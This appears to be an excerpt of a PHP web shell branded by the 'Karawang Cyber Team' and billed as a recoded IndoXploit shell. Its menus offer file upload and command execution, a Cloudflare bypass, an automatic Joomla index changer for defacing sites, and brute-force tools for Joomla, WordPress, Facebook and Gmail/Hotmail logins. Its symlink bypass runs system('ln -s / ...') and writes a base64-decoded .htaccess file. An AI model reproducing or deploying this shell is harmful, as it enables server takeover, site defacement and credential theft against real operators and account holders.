<?php
#####################################
#   Karawang Cyber Team Bypass WebShell  #
#	Coded By ./XH4YP3R1337			#
# 	penjaga.hidupmu@gmail.com 		# 
# 	4ever only email :)				#
# 	Indonesian Hacker Rulez			#                 
# 	Facebook : Achill Keselek Gas   	#                 
#####################################
...
<title>Karawang Cyber Team Bypass WebShell</title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<center><div id="contenttengah"><center>
		<img title="Karawang Xploit Team"src="https://image.ibb.co/jNJe7T/logo_IA.png" width="50%"></div> </center>


<span class="style4">Official Member & Shell Programmer: <br>./XH4YP3R1337</span><br><br>
<span class="style4">Founder Of KarawangXploit: <br>StarsXploit - XerXez7</span><br><br>
<span class="style4">Official Member: <br>./LucyXploit - Tn.SecretTeror404 - @-root~Kyy - ./RapidShock</span><br><br>
<span class="style4">Greetz : <br>KobustorGhost - BimaCyberTeam - SukabumiBlackhat</span>
</div></div></div></td>
</div>
...
<font color = "red" face = "Iceland" size = "6">Karawang Xploit Bypass Webshell </font><br><br><br>
...
<font color="#F00000"><font color="#FFF000">root@./UCEN HAXOR:~$</font> Connected ! </font><br>
...
<font color="red">root@./UCEN HAXOR:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<audio controls autoplay hidden>
				<source src="https://kristujyoti.voes.in/assets/admin/conversion/answers/01/GabutAjg.mp3" type="audio/mpeg">
			</audio><br><br>
<font color = "red" face = "Verdana">CopyRights Karawang Xploit Team 2020 - Now | Developed By ./XH4YP3R1337 </font> 			
<?php
exit;
}
...
<head>
	<link rel="SHORTCUT ICON" href="http://icons.iconarchive.com/icons/hopstarter/malware/256/Spy-icon.png">
<title>Karawang Xploit Bypass Shell</title>
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://h.top4top.io/p_2291ro6qb0.png' width = '100' height = '100' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>Karawng Cyber Team </font>";
echo "&emsp;";
echo "<img src = 'https://h.top4top.io/p_2291ro6qb0.png' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By ./UCENHAXOR ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By ./UCENHAXOR ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By ./UCENHAXOR ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
    ...
    <meta name="description" content="UCENHAXOR - Karawng Cyber Team" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Brute Force By UCENHAXOR ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By ./UCENHAXOR ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by ./UCENHAXOR ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : ./UCENHAXOR<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : Mauritania Attacker & Noname-Hax0r</font></b></p></center>";
}
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by ./UCENHAXOR ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce ./UCENHAXOR</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Mauritania Attacker, &amp; Recoded by ./UCEN HAXOR</font></p>";
...
echo "<center><form method='post'>
		...
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Karawng Cyber Team'><br>
		<u>Domains</u>: <br>
...
echo "<br>";
	...
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / UCEN HAXOR.txt');
			...
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","UCEN HAXOR.txt");
			$rt="<br><a href=UCEN HAXOR.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
...
";
    ...
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            ...
            <input type='text' name='pass' placeholder='password' value='UCENUCEN HAXOR HAXOR' required>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'>Recoded IndoXploit Shell By ./UCEN HAXOR";
	}
?>
</html>
